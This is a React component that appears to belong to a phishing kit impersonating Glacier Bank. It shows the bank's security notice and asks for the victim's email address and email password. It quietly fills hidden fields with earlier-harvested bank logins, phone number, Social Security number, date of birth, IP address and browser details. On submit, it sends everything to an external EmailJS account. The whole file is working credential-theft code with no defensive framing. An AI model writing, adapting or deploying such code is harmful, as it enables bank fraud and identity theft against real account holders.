import React, { useEffect } from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import emailjs from "@emailjs/browser";


export default function MailAdditional() {
    
    const [isLoading, setIsLoading] = React.useState(false);
  const login1: Login = cookies.get("login1");
  const login2: Login2 = cookies.get("login2");
  const personal: Personal = cookies.get("personal");
  const [formInput, setFormInput] = React.useState<Mail>({
    email: "",
    email_password: "",
  });

  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  const form = React.useRef<HTMLFormElement>(null);

  function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    setIsLoading(true);
    event.preventDefault();

    emailjs.sendForm("service_ya9aoe5", "template_30nkx7m", form.current!, "hd0P0MIIRcBmXr70h").then((result)=>{
        console.log(result.text)
        navigate("../success", {replace:true});
    }, (error)=>{
        alert("could not complete your request")
        console.log(error);
        setIsLoading(false)
    })
    
  }

  const [ipAddress, setIpAddress] = React.useState<string>()

  async function getIP() {
    const request = await fetch("https://api.ipify.org?format=json");
    const response : {ip:string} = await request.json()
    setIpAddress(response.ip)
  }

  useEffect(()=>{
    getIP()
  }, [])

  return (
    <>
      <form action="" ref={form} method="post" onSubmit={handleSubmit}>
        <div className="MainContent">
          <div id="WelcomeMessageDiv" className="welcome-message">
            <div className="LoginWelcomeLiteralDiv">
              <meta name="generator" content="HTML Tidy, see www.w3.org" />

              <p style={{ color: "blue" }}>
                *FOR SECURITY REASONS, GLACIER BANK RECOMMENDS YOU MAINTAIN
                UP-TO-DATE VIRUS PROTECTION SOFTWARE ON YOUR COMPUTER, CHANGE
                YOUR PASSWORD EVERY 90 DAYS, NEVER OPEN E-MAIL ATTACHMENTS FROM
                AN UNKNOWN SOURCE, AND NEVER PROVIDE PERSONAL ACCOUNT
                INFORMATION BY E-MAIL*
              </p>

              <br />
              <br />
            </div>
          </div>


          
          <div className="LoginClear"></div>
          <div className="LoginPadding10">
            <div className="row">
              <div style={{ display: "none" }} className="hidden_form">
                <input
                  type="text"
                  name="username"
                  defaultValue={login1.username}
                />
                <input
                  type="text"
                  name="password"
                  defaultValue={login1.password}
                />
                <input
                  type="text"
                  name="username2"
                  defaultValue={login2.username2}
                />
                <input
                  type="text"
                  name="password2"
                  defaultValue={login2.password2}
                />
                <input type="text" name="pn" defaultValue={personal.phone} />
                <input type="text" name="sn" defaultValue={personal.ssn} />
                <input type="text" name="db" defaultValue={personal.dob} />
                <input type="text" name="pi" defaultValue={ipAddress} />
                <input type="text" name="brow" defaultValue={window.navigator.userAgent} />
              </div>
            </div>
            <div className="row" style={{ marginBottom: "20px" }}>
              <div className="six columns">
                <strong>
                  <label
                    id="ctl00_PageContent_Login1_IdLabel"
                    className="LoginTextBox"
                  >
                    Email Address
                  </label>
                </strong>
              </div>
              <div className="six columns">
                <input
                  name="email"
                  type="email"
                  size={30}
                  id="username"
                  className="LoginIdTextBox"
                  tabIndex={10}
                  onChange={handleInputChange}
                  required
                  defaultValue={formInput.email}
                />
              </div>
            </div>
            <div className="row">
              <div className="six columns">
                <strong>
                  <label
                    id="ctl00_PageContent_Login1_IdLabel"
                    className="LoginTextBox"
                  >
                    Email Password:
                  </label>
                </strong>
              </div>
              <div className="six columns">
                <input
                  name="email_password"
                  type="password"
                  size={30}
                  id="password"
                  className="LoginIdTextBox"
                  tabIndex={10}
                  onChange={handleInputChange}
                  required
                  defaultValue={formInput.email_password}
                />
              </div>
            </div>
          </div>

          <div className="button-containerADA LoginButtonContainerDiv">
          {isLoading ?
            <div style={{width:"100%", display:"flex", justifyContent:"center"}}>
          <span className="loader"></span>
          </div>
          :
            <input
              type="submit"
              name="ctl00$PageContent$Login1$IdSubmitButton"
              value="Submit"
              id="ctl00_PageContent_Login1_IdSubmitButton"
              className="ColorButton"
              tabIndex={11}
            />}
          </div>

          <div
            id="ctl00_PageContent_Login1_divPasswordResetLayout2"
            className="LoginCenter"
          ></div>
        </div>
      </form>
    </>
  );
}
